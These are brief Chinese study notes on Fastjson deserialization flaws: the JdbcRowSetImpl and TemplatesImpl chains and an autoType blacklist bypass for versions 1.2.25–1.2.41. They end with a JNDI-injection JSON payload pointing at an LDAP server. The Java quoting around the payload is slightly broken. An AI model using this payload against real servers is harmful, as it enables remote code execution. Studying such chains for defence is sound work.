# FastJson

# 漏洞成因与分析

## Fastjson ≤ 1.2.24

### jdbcRowSetImpl利用链

最终导致JNDI注入

**RMI+JNDI**

**LDAP+JNDI**

### TemplatesImpl利用链

由于payload需要赋值的一些属性为`private`类型，需要在`parse()` 反序列化时设置第二个参数`Feature.SupportNonPublicField` ，服务端才能从JSON中恢复`private` 类型的属性

## Fastjson高版本绕过

### 1.2.25-1.2.41绕过

1.2.25加强了对类的checkAutoType()的检查，会对要加载的类进行白名单和黑名单限制，并引入了一个配置参数AutoTypeSupport，AutoTypeSupport默认为false，即开启白名单检测

- 白名单很难绕过
- 黑名单则是如果以L开头;结尾，则去掉开头和结尾进行类加载

```java
{" 
    "\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\"," +
    "\"dataSourceName\":\"ldap://127.0.0.1:9999/EXP\", " +
    "\"autoCommit\":true" 
"}
//其他利用链也同理+

```